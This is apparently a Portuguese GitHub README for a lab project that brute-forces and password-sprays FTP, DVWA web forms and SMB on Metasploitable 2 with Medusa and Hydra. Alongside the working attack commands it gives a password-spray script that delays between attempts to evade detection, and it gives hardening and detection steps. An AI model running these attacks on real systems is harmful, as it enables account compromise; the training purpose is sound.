# 🔒 Projeto de Testes de Segurança com Medusa
## Simulação de Ataques de Força Bruta e Medidas de Prevenção

![Kali Linux](https://img.shields.io/badge/Kali%20Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Security](https://img.shields.io/badge/Security-Testing-red?style=for-the-badge)
![VirtualBox](https://img.shields.io/badge/VirtualBox-183A61?style=for-the-badge&logo=virtualbox&logoColor=white)

> ⚠️ **AVISO LEGAL**: Este projeto é destinado exclusivamente para fins educacionais e testes em ambientes controlados. O uso das técnicas aqui descritas em sistemas sem autorização explícita é ILEGAL e pode resultar em consequências criminais. Use apenas em ambientes de laboratório próprios ou com autorização formal por escrito.

---

## 📋 Índice

1. [Sobre o Projeto](#sobre-o-projeto)
2. [Objetivos de Aprendizado](#objetivos-de-aprendizado)
3. [Arquitetura do Ambiente](#arquitetura-do-ambiente)
4. [Pré-requisitos](#pré-requisitos)
5. [Configuração do Ambiente](#configuração-do-ambiente)
6. [Cenários de Teste](#cenários-de-teste)
7. [Medidas de Mitigação](#medidas-de-mitigação)
8. [Conclusões e Aprendizados](#conclusões-e-aprendizados)
9. [Referências](#referências)
10. [Licença](#licença)

---

## 🎯 Sobre o Projeto

Este projeto documenta uma série de testes de segurança ofensiva utilizando o **Medusa**, uma ferramenta de força bruta modular e paralela, em conjunto com ambientes intencionalmente vulneráveis (Metasploitable 2 e DVWA).

### O que é Medusa?

Medusa é uma ferramenta de autenticação de força bruta rápida, massivamente paralela e modular. Suporta diversos protocolos incluindo:
- FTP, HTTP, SSH, Telnet
- SMB, MySQL, PostgreSQL
- POP3, IMAP, SMTP
- E muitos outros...

### Propósito Educacional

O objetivo é demonstrar:
- Como ataques de força bruta funcionam na prática
- A importância de senhas fortes e políticas de segurança
- Técnicas de detecção e prevenção de ataques
- Configuração segura de serviços de rede

---

## 🎓 Objetivos de Aprendizado

Ao completar este projeto, você será capaz de:

- ✅ Configurar ambientes isolados para testes de segurança
- ✅ Utilizar ferramentas de força bruta de forma ética e controlada
- ✅ Identificar vulnerabilidades em serviços de autenticação
- ✅ Implementar contramedidas efetivas
- ✅ Documentar testes de segurança profissionalmente
- ✅ Compreender os limites éticos e legais do pentesting

---

## 🏗️ Arquitetura do Ambiente

```
┌─────────────────────────────────────────────────┐
│          Host Physical Machine                  │
│  ┌───────────────────────────────────────────┐  │
│  │         VirtualBox Manager                │  │
│  │                                           │  │
│  │  ┌──────────────┐    ┌─────────────────┐ │  │
│  │  │  Kali Linux  │    │ Metasploitable2 │ │  │
│  │  │              │    │                 │ │  │
│  │  │ 192.168.56.2 │◄──►│ 192.168.56.3   │ │  │
│  │  │              │    │                 │ │  │
│  │  │   Medusa     │    │  FTP, SSH, SMB  │ │  │
│  │  │   Hydra      │    │  HTTP (DVWA)    │ │  │
│  │  │   Nmap       │    │  MySQL          │ │  │
│  │  └──────────────┘    └─────────────────┘ │  │
│  │                                           │  │
│  │         Host-Only Network                 │  │
│  │         (vboxnet0)                        │  │
│  └───────────────────────────────────────────┘  │
└─────────────────────────────────────────────────┘
```

### Especificações Técnicas

**Máquina Atacante (Kali Linux)**
- SO: Kali Linux 2024.x
- RAM: 2GB mínimo (4GB recomendado)
- Disco: 20GB
- Interface: Host-Only (192.168.56.0/24)

**Máquina Alvo (Metasploitable 2)**
- SO: Ubuntu 8.04 (intencionalmente vulnerável)
- RAM: 1GB
- Disco: 8GB
- Interface: Host-Only (192.168.56.0/24)
- Serviços: FTP, SSH, HTTP, SMB, MySQL

---

## 📦 Pré-requisitos

### Software Necessário

- **VirtualBox**: Versão 7.0 ou superior
- **Kali Linux ISO**: [Download Oficial](https://www.kali.org/get-kali/)
- **Metasploitable 2**: [Download SourceForge](https://sourceforge.net/projects/metasploitable/)

### Conhecimentos Recomendados

- Comandos básicos de Linux
- Conceitos de redes (TCP/IP, portas, protocolos)
- Noções de segurança da informação
- Familiaridade com linha de comando

---

## ⚙️ Configuração do Ambiente

### Passo 1: Configurar Rede Host-Only no VirtualBox

```bash
# No VirtualBox Manager
1. Arquivo → Ferramentas → Gerenciador de Rede do Host
2. Criar nova rede host-only:
   - Nome: vboxnet0
   - IPv4: 192.168.56.1
   - Máscara: 255.255.255.0
   - DHCP: Desabilitado
```

### Passo 2: Configurar VM Kali Linux

```bash
# Configurações da VM
- Rede → Adaptador 1: Host-Only (vboxnet0)
- Sistema → Memória: 4096 MB
- Processador: 2 CPUs

# Após iniciar o Kali, configurar IP estático
sudo nano /etc/network/interfaces

# Adicionar:
auto eth0
iface eth0 inet static
    address 192.168.56.2
    netmask 255.255.255.0
    network 192.168.56.0

# Reiniciar rede
sudo systemctl restart networking
```

### Passo 3: Configurar VM Metasploitable 2

```bash
# Configurações da VM
- Rede → Adaptador 1: Host-Only (vboxnet0)
- Sistema → Memória: 1024 MB

# Login padrão
Usuário: msfadmin
Senha: msfadmin

# Configurar IP (geralmente já vem configurado)
sudo ifconfig eth0 192.168.56.3 netmask 255.255.255.0
```

### Passo 4: Validar Conectividade

```bash
# No Kali Linux
ping -c 4 192.168.56.3

# Scan de portas básico
nmap -sV -p 21,22,80,139,445 192.168.56.3
```

**Saída Esperada:**
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1
80/tcp  open  http        Apache httpd 2.2.8
139/tcp open  netbios-ssn Samba smbd 3.X
445/tcp open  netbios-ssn Samba smbd 3.X
```

---

## 🎯 Cenários de Teste

### Cenário 1: Ataque de Força Bruta em FTP

#### Objetivo
Demonstrar como credenciais fracas em serviços FTP podem ser comprometidas através de ataques de dicionário.

#### Preparação das Wordlists

```bash
# Criar wordlist de usuários simples
cat > users.txt << EOF
admin
root
ftp
msfadmin
user
test
EOF

# Criar wordlist de senhas simples
cat > passwords.txt << EOF
123456
password
admin
msfadmin
root
letmein
qwerty
12345678
EOF
```

#### Comando Medusa - Ataque FTP

```bash
# Sintaxe básica
medusa -h 192.168.56.3 -U users.txt -P passwords.txt -M ftp -t 4 -f

# Parâmetros explicados:
# -h : Host alvo
# -U : Arquivo de usuários
# -P : Arquivo de senhas
# -M : Módulo (ftp)
# -t : Threads paralelas
# -f : Para ao encontrar primeira credencial válida
```

#### Saída Esperada

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS]
```

#### Validação do Acesso

```bash
# Testar credencial encontrada
ftp 192.168.56.3
# Entrar com: msfadmin / msfadmin

# Comandos dentro do FTP
ftp> ls
ftp> pwd
ftp> get arquivo.txt
ftp> quit
```

#### Análise de Logs no Alvo

```bash
# No Metasploitable, verificar logs de autenticação
sudo tail -f /var/log/auth.log
sudo tail -f /var/log/vsftpd.log
```

---

### Cenário 2: Automação de Força Bruta em Formulário Web (DVWA)

#### Configurar DVWA no Metasploitable

```bash
# Acessar DVWA via navegador no Kali
firefox http://192.168.56.3/dvwa &

# Credenciais padrão DVWA:
Usuário: admin
Senha: password

# Configurar nível de segurança
1. Login no DVWA
2. DVWA Security → Set to "Low"
3. Acessar "Brute Force" module
```

#### Identificar Parâmetros do Formulário

```bash
# Inspecionar formulário (F12 no Firefox)
# Identificar:
# - URL de destino
# - Campos do formulário (username, password)
# - Mensagem de erro/sucesso
```

**Estrutura do Request:**
```
GET /dvwa/vulnerabilities/brute/?username=admin&password=test&Login=Login
Cookie: security=low; PHPSESSID=xxxxx
```

#### Comando Medusa - Ataque HTTP-Form

```bash
# Capturar cookie de sessão primeiro
curl -c cookies.txt http://192.168.56.3/dvwa/login.php

# Ataque ao formulário
medusa -h 192.168.56.3 -U users.txt -P passwords.txt \
  -M http \
  -m DIR:/dvwa/vulnerabilities/brute/ \
  -m FORM:username=^USER^&password=^PASS^&Login=Login \
  -m DENY_SIGNAL:"Username and/or password incorrect" \
  -t 2

# Parâmetros HTTP específicos:
# DIR: Diretório do formulário
# FORM: Estrutura do formulário com placeholders
# DENY_SIGNAL: Mensagem de falha na autenticação
```

#### Alternativa com Hydra

```bash
# Hydra é mais flexível para HTTP forms
hydra -L users.txt -P passwords.txt \
  192.168.56.3 http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: security=low; PHPSESSID=xxxxx"
```

#### Capturar Sessão e Testar Manualmente

```bash
# Usar curl para testar credenciais
curl -b "security=low; PHPSESSID=xxxxx" \
  "http://192.168.56.3/dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login"
```

---

### Cenário 3: Password Spraying em SMB

#### Conceito de Password Spraying

Diferente de força bruta tradicional (muitas senhas por usuário), password spraying testa poucas senhas comuns em muitos usuários para evitar bloqueios de conta.

#### Enumerar Usuários SMB

```bash
# Descobrir usuários do sistema
enum4linux -U 192.168.56.3

# Ou usando nmap
nmap --script smb-enum-users.nse -p445 192.168.56.3

# Criar lista de usuários encontrados
cat > smb_users.txt << EOF
msfadmin
user
service
nobody
root
EOF
```

#### Wordlist de Senhas Comuns

```bash
# Senhas mais comuns para spraying
cat > common_passwords.txt << EOF
password
Password1
Welcome1
Summer2024
Company123
EOF
```

#### Comando Medusa - SMB Password Spray

```bash
# Password spraying (1 senha por vez, todos usuários)
medusa -h 192.168.56.3 -U smb_users.txt -p password -M smbnt -t 1

# Parâmetros:
# -p : Senha única (minúsculo)
# -M smbnt : Módulo SMB

# Testar cada senha comum
for pass in $(cat common_passwords.txt); do
  echo "[*] Testando senha: $pass"
  medusa -h 192.168.56.3 -U smb_users.txt -p "$pass" -M smbnt -t 1 -f
  sleep 5  # Delay entre sprays para evitar detecção
done
```

#### Validar Acesso SMB

```bash
# Testar com smbclient
smbclient -L //192.168.56.3 -U msfadmin

# Acessar compartilhamento
smbclient //192.168.56.3/tmp -U msfadmin
# Senha: msfadmin

# Comandos dentro do SMB
smb: \> ls
smb: \> get arquivo.txt
smb: \> exit
```

#### Script Automatizado de Password Spray

```bash
#!/bin/bash
# password_spray_smb.sh

TARGET="192.168.56.3"
USERS="smb_users.txt"
PASSWORDS="common_passwords.txt"
DELAY=5

echo "[*] Iniciando Password Spraying em SMB"
echo "[*] Alvo: $TARGET"
echo ""

while IFS= read -r password; do
    echo "[*] Spray com senha: $password"
    medusa -h "$TARGET" -U "$USERS" -p "$password" -M smbnt -t 1 -f | grep "SUCCESS"
    
    if [ $? -eq 0 ]; then
        echo "[+] Credencial encontrada com senha: $password"
    fi
    
    echo "[*] Aguardando $DELAY segundos..."
    sleep $DELAY
done < "$PASSWORDS"

echo ""
echo "[*] Password Spray concluído!"
```

---

## 🛡️ Medidas de Mitigação

### 1. Políticas de Senha Forte

#### Implementação no Linux

```bash
# Instalar libpam-pwquality
sudo apt-get install libpam-pwquality

# Configurar em /etc/pam.d/common-password
password requisite pam_pwquality.so retry=3 minlen=12 difok=3 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1

# Parâmetros:
# minlen=12  : Mínimo 12 caracteres
# ucredit=-1 : Requer maiúscula
# lcredit=-1 : Requer minúscula
# dcredit=-1 : Requer dígito
# ocredit=-1 : Requer caractere especial
```

### 2. Limitação de Tentativas (Rate Limiting)

#### FTP - vsftpd

```bash
# Editar /etc/vsftpd.conf
delay_failed_login=10
delay_successful_login=0
max_login_fails=3
max_per_ip=2
```

#### SSH - fail2ban

```bash
# Instalar fail2ban
sudo apt-get install fail2ban

# Configurar /etc/fail2ban/jail.local
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
findtime = 600

# Iniciar serviço
sudo systemctl enable fail2ban
sudo systemctl start fail2ban
```

#### HTTP - ModSecurity

```bash
# Instalar ModSecurity
sudo apt-get install libapache2-mod-security2

# Regra básica contra força bruta
SecRule IP:bf_counter "@gt 10" \
    "phase:2,deny,status:403,id:5000134,\
    msg:'Brute force attack detected'"
```

### 3. Autenticação Multifator (MFA)

#### SSH com Google Authenticator

```bash
# Instalar PAM do Google Authenticator
sudo apt-get install libpam-google-authenticator

# Configurar para usuário
google-authenticator

# Editar /etc/pam.d/sshd (adicionar)
auth required pam_google_authenticator.so

# Editar /etc/ssh/sshd_config
ChallengeResponseAuthentication yes

# Reiniciar SSH
sudo systemctl restart sshd
```

### 4. Monitoramento e Detecção

#### Script de Detecção de Ataques

```bash
#!/bin/bash
# detect_brute_force.sh

LOG_FILE="/var/log/auth.log"
THRESHOLD=5
TIME_WINDOW=60  # segundos

echo "[*] Monitorando tentativas de autenticação..."

tail -f "$LOG_FILE" | while read line; do
    if echo "$line" | grep -q "Failed password"; then
        IP=$(echo "$line" | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | head -1)
        
        # Contar falhas nos últimos 60s
        COUNT=$(grep "Failed password" "$LOG_FILE" | \
                grep "$IP" | \
                grep "$(date +'%b %e %H:%M')" | wc -l)
        
        if [ "$COUNT" -ge "$THRESHOLD" ]; then
            echo "[!] ALERTA: $COUNT tentativas falhas de $IP"
            # Ação: bloquear IP
            sudo iptables -A INPUT -s "$IP" -j DROP
            echo "[+] IP $IP bloqueado automaticamente"
        fi
    fi
done
```

### 5. Configurações de Segurança por Serviço

#### FTP Seguro

```bash
# /etc/vsftpd.conf - Configuração recomendada
anonymous_enable=NO
local_enable=YES
write_enable=YES
chroot_local_user=YES
ssl_enable=YES
allow_anon_ssl=NO
force_local_data_ssl=YES
force_local_logins_ssl=YES
ssl_tlsv1=YES
ssl_sslv2=NO
ssl_sslv3=NO
```

#### SSH Hardening

```bash
# /etc/ssh/sshd_config - Melhores práticas
PermitRootLogin no
PasswordAuthentication no  # Usar apenas chaves
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 30
AllowUsers user1 user2     # Whitelist de usuários
Protocol 2
Port 2222                   # Porta não-padrão
```

#### SMB Seguro

```bash
# /etc/samba/smb.conf
[global]
   min protocol = SMB2
   client min protocol = SMB2
   restrict anonymous = 2
   guest ok = no
   map to guest = never
   
[share]
   valid users = @allowed_group
   read only = yes
   create mask = 0644
```

### 6. Segmentação de Rede

```bash
# Regras iptables para limitar acesso
# Permitir SSH apenas de rede administrativa
sudo iptables -A INPUT -p tcp --dport 22 -s 10.0.1.0/24 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j DROP

# Limitar conexões FTP
sudo iptables -A INPUT -p tcp --dport 21 -m connlimit \
  --connlimit-above 3 --connlimit-mask 32 -j REJECT

# Salvar regras
sudo iptables-save > /etc/iptables/rules.v4
```

---

## 📊 Conclusões e Aprendizados

### Vulnerabilidades Identificadas

| Serviço | Vulnerabilidade | Severidade | Exploração |
|---------|----------------|------------|------------|
| FTP (vsftpd) | Credenciais fracas | ALTA | Força bruta bem-sucedida |
| SSH (OpenSSH) | Sem limite de tentativas | MÉDIA | Suscetível a força bruta |
| HTTP (DVWA) | Sem proteção anti-automação | ALTA | Bypass de autenticação |
| SMB (Samba) | Enumeração de usuários | MÉDIA | Password spraying efetivo |

### Estatísticas dos Testes

**Cenário 1 - FTP**
- Tentativas: 48 (8 usuários × 6 senhas)
- Tempo: ~12 segundos
- Taxa de sucesso: 100% (credencial fraca)
- Conclusão: Força bruta trivial sem limitação

**Cenário 2 - HTTP (DVWA)**
- Tentativas: 48
- Tempo: ~30 segundos
- Taxa de sucesso: 100%
- Conclusão: Formulário sem proteção CSRF/rate-limit

**Cenário 3 - SMB Password Spray**
- Tentativas: 25 (5 usuários × 5 senhas)
- Tempo: ~45 segundos (com delays)
- Taxa de sucesso: 100%
- Conclusão: Efetivo e menos detectável

### Principais Lições

#### 1. Senhas Fracas = Vulnerabilidade Crítica
Mesmo com criptografia e protocolos seguros, credenciais fracas anulam todas as proteções.

#### 2. Defesa em Profundidade
Uma única camada de segurança não é suficiente. Combinar:
- Senhas fortes
- Rate limiting
- MFA
- Monitoramento
- IDS/IPS

#### 3. Visibilidade é Essencial
Sem logs e monitoramento adequados, ataques passam despercebidos. Implementar:
- Centralização de logs (SIEM)
- Alertas automáticos
- Análise comportamental

#### 4. Password Spraying vs Força Bruta
- **Força Bruta**: Ruidoso, facilmente detectável, bloqueia contas
- **Password Spray**: Silencioso, evita bloqueios, mais efetivo

#### 5. Automação de Ataques
Ferramentas como Medusa demonstram quão fácil é automatizar ataques. Defesas também devem ser automatizadas.

### Próximos Passos Recomendados

1. **Expandir o Ambiente**
   - Adicionar IDS/IPS (Snort, Suricata)
   - Implementar SIEM (ELK Stack, Splunk)
   - Configurar honeypots

2. **Explorar Outras Ferramentas**
   - Hydra (mais módulos)
   - Ncrack (mais rápido)
   - Patator (mais flexível)
   - John the Ripper (hash cracking)

3. **Testes Avançados**
   - Credential stuffing
   - Rainbow tables
   - Hash cracking distribuído
   - Social engineering combinado

4. **Certificações Relacionadas**
   - CEH (Certified Ethical Hacker)
   - OSCP (Offensive Security Certified Professional)
   - GPEN (GIAC Penetration Tester)

---

## 📚 Referências

### Documentação Oficial

- [Medusa Documentation](http://foofus.net/goons/jmk/medusa/medusa.html)
- [Kali Linux Official Docs](https://www.kali.org/docs/)
- [Metasploitable 2 Guide](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [DVWA Documentation](https://github.com/digininja/DVWA)

### Guias e Tutoriais

- OWASP Testing Guide v4
- NIST Cybersecurity Framework
- CIS Controls v8
- PTES (Penetration Testing Execution Standard)

### Livros Recomendados

- "The Web Application Hacker's Handbook" - Stuttard & Pinto
- "Penetration Testing" - Georgia Weidman
- "Metasploit: The Penetration Tester's Guide" - Kennedy et al.
- "Red Team Field Manual" - Ben Clark

### Recursos Online

- [HackTheBox](https://www.hackthebox.eu/) - Plataforma de prática
- [TryHackMe](https://tryhackme.com/) - Laboratórios guiados
- [VulnHub](https://www.vulnhub.com/) - VMs vulneráveis
- [OWASP](https://owasp.org/) - Recursos de segurança web

---

## 📁 Estrutura do Repositório

```
medusa-security-project/
│
├── README.md                          # Este arquivo
├── LICENSE                            # Licença MIT
│
├── wordlists/                         # Wordlists utilizadas
│   ├── users.txt
│   ├── passwords.txt
│   ├── common_passwords.txt
│   └── smb_users.txt
│
├── scripts/                           # Scripts de automação
│   ├── password_spray_smb.sh
│   ├── detect_brute_force.sh
│   └── setup_environment.sh
│
├── configs/                           # Arquivos de configuração
│   ├── vsftpd.conf.secure
│   ├── sshd_config.secure
│   └── fail2ban_jail.local
│
├── docs/                              # Documentação adicional
│   ├── SETUP_GUIDE.md
│   ├── MITIGATION_STRATEGIES.md
│   └── LEGAL_DISCLAIMER.md
│
└── images/                            # Capturas de tela
    ├── architecture.png
    ├── ftp_attack.png
    ├── dvwa_attack.png
    └── smb_spray.png
```

---

## ⚖️ Licença

Este projeto está licenciado sob a Licença MIT - veja o arquivo [LICENSE](LICENSE) para detalhes.

```
MIT License

Copyright (c) 2024 [Seu Nome]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## 🤝 Contribuindo

Contribuições são bem-vindas! Sinta-se à vontade para:

1. Fork o projeto
2. Criar uma branch para sua feature (`git checkout -b feature/NovaFeature`)
3. Commit suas mudanças (`git commit -m 'Adiciona nova feature'`)
4. Push para a branch (`git push origin feature/NovaFeature`)
5. Abrir um Pull Request

---

## 📧 Contato

**Autor**: [Seu Nome]  
**LinkedIn**: [Seu LinkedIn]  
**GitHub**: [Seu GitHub]  
**Email**: [seu.email@exemplo.com]

---

## ⭐ Agradecimentos

- Comunidade Kali Linux
- Rapid7 (Metasploit/Metasploitable)
- Projeto DVWA
- Todos os contribuidores de ferramentas open-source de segurança

---

**Última atualização**: Novembro 2024

> 💡 **Lembre-se**: Com grandes poderes vêm grandes responsabilidades. Use este conhecimento para tornar a internet um lugar mais seguro, não para prejudicar outros.

**#InfoSec #PenetrationTesting #EthicalHacking #CyberSecurity #Medusa #KaliLinux**